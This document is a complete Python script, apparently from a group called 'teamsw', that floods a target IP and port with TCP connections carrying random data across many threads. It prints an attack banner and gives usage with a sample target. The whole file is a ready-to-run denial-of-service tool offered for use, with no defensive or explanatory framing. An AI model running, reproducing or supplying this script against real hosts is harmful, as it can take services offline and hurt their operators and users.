#==================[CoDe By teamsw]===================
from threading import Thread
import socket, sys, random
#===================[SYS]===================
ip = sys.argv[1]
port = int(sys.argv[2])
thread = int(sys.argv[3])
#===================[ATTACK]===================
def tcp():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tar = (str(ip),int(port))
            bytes = random._urandom(1024)
            s.connect(tar)
            for _ in range(600):
                s.send(bytes)
        except:
            s.close()
#===================[BANNER]===================
print("""
------------[Dev www.teamsw.cn]------------

===============[TCP FLOOD]===============

""")
print(f"Attack Started To {str(ip)} On Port {str(port)}")
#===================[THREAD]===================
for _ in range(thread - 1):
    Thread(target=tcp).start()
#==================[########]===================
#                 www.teamsw.cn
#==================[########]===================

#==================[########]===================
#tcp flood script coded in python.
#can be run on linux ,windows.... note : need python3.
#commands : python3 teamsw.py <ip> <port> <thread> 
#example :python3 teamsw.py 1.1.1.1 80 100
#==================[########]===================
